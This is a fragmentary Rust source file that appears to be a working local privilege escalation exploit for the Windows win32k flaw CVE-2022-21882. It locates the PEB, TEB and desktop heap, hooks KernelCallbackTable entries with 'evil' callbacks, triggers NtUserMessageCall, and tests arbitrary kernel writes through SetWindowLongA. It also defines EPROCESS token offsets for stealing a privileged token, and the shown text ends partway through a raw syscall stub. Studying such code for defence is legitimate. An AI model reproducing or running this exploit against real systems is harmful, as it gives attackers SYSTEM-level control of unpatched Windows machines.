...
use std::{
    ...
    sync::RwLock, os::windows::prelude::OsStrExt
};
...
lazy_static!(
    ...
    static ref REALLCALLBACK2 : RwLock<usize> = RwLock::new(0);
    ...
    static ref CALLBACKSTATE : RwLock<u8> = RwLock::new(2);
);
...
type ClientFreeWindowClassExtraBytes = extern "system" fn(
    size_t: *const usize
) -> u32;
...
#[link(name = "ntusermsgcall", kind = "static")]
extern "system" { fn NtUserMessageCall(
    hwnd: HWND, msg: u32, wpar: usize, lpar: usize, resinfo: usize, dwtype: u32, bascii: i32); }
...
fn main() {
    ...
    buildnumber &= 0xffff;
    //only check it on thes
    if buildnumber < 19041 || buildnumber > 19043 {
    ...
    let mut realcallback2 = REALLCALLBACK2.write().unwrap();
    ...
    *gaddr = victim1addr as usize;
    ...
    let tebptr = cve_2022_21882::get_teb();
    println!("[+]TEB address: {:?}", tebptr);
    let desktopheap = cve_2022_21882::get_um_mapped_desktopheap(tebptr);
    ...
    *gvictimoffs = tagwnd0offset;
    ...
    let evilcallback2 = evil_callback2 as *mut c_void;
    println!("[+]Evil callback address: {:?}", evilcallback);
    let pebptr = cve_2022_21882::get_peb();
    println!("[+]PEB address: {:?}", pebptr);
    let callbacktable: usize = cve_2022_21882::get_callback_table(pebptr);
    println!("[+]Callback table address: {:#x}", callbacktable);
    let tableoffset : usize = 0x7b;
    let tableoffset2 : usize = 0x7c;
    let callbackaddr : usize = *((callbacktable + 
        (tableoffset * size_of::<usize>())) as *const usize);
    let callbackaddr2 : usize = *((callbacktable + 
        (tableoffset2 * size_of::<usize>())) as *const usize);
    *realcallback = callbackaddr;
    *realcallback2 = callbackaddr2;
    drop(realcallback);
    drop(realcallback2);
    let mut evilhwnd = create_window_2();
    cve_2022_21882::patch_callback_table(
        evilcallback, callbacktable as *mut c_void, tableoffset);
    //also hook __xxxClientFreeWindowCLassExtraBytes 0x7c
    //need to hook this now too for the switch window proc 
    cve_2022_21882::patch_callback_table(
        evilcallback2, callbacktable as *mut c_void, tableoffset2);
    NtUserMessageCall(evilhwnd, WM_CREATE, 0, 0, 0, 0xe0, 1);
...
unsafe fn create_window_2() -> HWND {
    let instance1 = GetModuleHandleA(None);
    //this time we just create a system menu then change the window to trigger
    //xxxclientallocextrabytes
    let class1name = b"sploitWnd\0";
...
unsafe fn arbitrary_write_test(evilhwnd: HWND) -> u8 {
    ...
    SetLastError(0);
    //since we switched windows the offset has changed slightly (-0x10)
    let mut status = SetWindowLongA(evilhwnd, 0xc8+0x10, 0xfffffff);
    ...
    status = SetWindowLongA(evilhwnd, 0x128+0x10, 0x20);
    err = GetLastError();
    if status == 0 && err != 0 {
        return 1
    }
...
unsafe fn arbitrary_read_write(hwnd1offset: usize, 
    ...
    let uniqueprocessid: u32 = 0x440;
    let inheritedfromuniquepid: u32 = 0x540;
    let token: u32 = 0x4b8;
    let activeprocesslinks: u32 = 0x448;
...
extern "stdcall" fn evil_callback2(cbwndextrasize: *const usize) -> u32 {
    let realcallback = REALLCALLBACK2.read().unwrap();
    unsafe {
        let addr = *cbwndextrasize;
        let poi = (addr + 0xc8) as *const u32;
        let value = *poi;
        let clientfreew: ClientFreeWindowClassExtraBytes = transmute(
            *realcallback
        );
        if value == 0x200 {
            return 1;
            ...
            return clientfreew(cbwndextrasize);
        }
    }
}

//scandalous naked functions, too hot for llvm to handle
//you can do this instead of linking in a static .lib, although
//i don't love calling naked functions
#[naked]
extern "stdcall" fn ntusermessagecall0(
    hwnd: HWND, msg: u32, wpar: WPARAM, lpar: LPARAM, resinfo: usize, dwtype: u32, bascii: i32) {
    unsafe {
        asm!("mov r10, rcx",
             "mov eax, 0x1007",
             "syscall",
